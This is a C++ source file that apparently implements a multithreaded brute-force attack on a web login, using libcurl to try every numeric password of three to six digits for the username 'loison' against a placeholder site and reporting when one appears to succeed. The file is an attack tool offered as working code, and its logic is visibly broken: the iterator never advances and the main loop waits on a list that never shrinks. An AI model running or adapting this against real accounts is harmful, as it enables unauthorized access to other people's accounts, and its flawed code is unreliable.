#include <iostream>
#include <curl/curl.h>
#include <cmath>
#include <string>
#include <thread>
#include <vector>
#include <map>
#include <tuple>
#include <unistd.h>
#include <sys/time.h>

#define WEBSITE "example.com"
#define INDEX_SIZE 10 
#define MAX_LIST_LENGTH 6
#define THREADS_NUMBER 2
#define MIN_LIST_LENGTH 3

using namespace std;

vector<string> urls;
unsigned long urlsInitSize = 0, newTime = 0, index = 0;
static const char alphaLower[] = "0123456789";
// 0123456789
// abcdefghijklmnopqrstuvwxyz
// ABCDEFGHIJKLMNOPQRSTUVWXYZ
// !"~$%&'()*+,-./:;<=>?@[\]^_`{|}~
vector<thread> threads;
vector<string>::iterator it, itEnd;

void disable()
{
	for(unsigned int threadIndex = 0; threadIndex < THREADS_NUMBER; threadIndex++)
    {
        threads[threadIndex].detach();
    }
	exit(0);
}

size_t writeCallback(void *contents, size_t size, size_t nmemb, void *userp)
{
    ((string*)userp)->append((char*)contents, size *nmemb);
    return size *nmemb;
}

void findFoldersRecursive(string url, unsigned short maxLength, unsigned short index)
{
    if(index >= maxLength)
		urls.push_back(url);
    else
        for(unsigned short alphaLowerIndex = 0; alphaLowerIndex < INDEX_SIZE; alphaLowerIndex++)
            findFoldersRecursive(url + alphaLower[alphaLowerIndex], maxLength, index + 1);
}

void findFolders()
{
    for(unsigned short lengthIndex = MIN_LIST_LENGTH; lengthIndex <= MAX_LIST_LENGTH; lengthIndex++)
        findFoldersRecursive("", lengthIndex, 0);
}

void testFunction()
{
	string content = "", url;
	CURL* curl = curl_easy_init();
    curl_easy_setopt(curl, CURLOPT_USERNAME, "loison");
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writeCallback);
    curl_easy_setopt(curl, CURLOPT_URL, WEBSITE);
	curl_easy_setopt(curl, CURLOPT_WRITEDATA, &content);
	string threadIt;
	while(it != itEnd)
	{
		url = *next(it, 2);
		//threadIt--;
		//url = *(threadIt);
		// index--;

		curl_easy_setopt(curl, CURLOPT_PASSWORD, url.c_str());
		 cout << url << endl;
        curl_easy_perform(curl);
        // cout << content << endl;
        if(content[14] == '>') { cout << "Password found: " << url << endl; disable(); }
		content = "";
		index--;
	}
}

unsigned long timeMillis()
{
    struct timeval tp;
    gettimeofday(&tp, NULL);
    return tp.tv_sec * 1000 + tp.tv_usec / 1000;
}

double generalSpeed()
{
	return (urlsInitSize - index) * 1000 / (timeMillis() - newTime + 1);
}

int main()
{
	unsigned long possibilities = 0;
	for(unsigned short length = MIN_LIST_LENGTH; length < MAX_LIST_LENGTH; length++)
		possibilities += pow(INDEX_SIZE, length);
    cout << "There will have " << possibilities << " possibilities..." << endl;
	urls.push_back("patch");
   	findFolders();
	urlsInitSize = urls.size();
	index = urlsInitSize;
	it = urls.begin();
	cout << "Real possibilities: " << urlsInitSize << endl;
	newTime = timeMillis();
	for(unsigned int threadIndex = 0; threadIndex < THREADS_NUMBER; threadIndex++)
	{
		threads.push_back(thread(testFunction));
	}

	while(urls.size() != 0)
	{
		cout << timeMillis() - newTime << " : " << index << " / " << urlsInitSize << " | " << generalSpeed() << " tests/s"<< endl;
		sleep(1);
	}
	cout << "Not found !" << endl;
	disable();
}
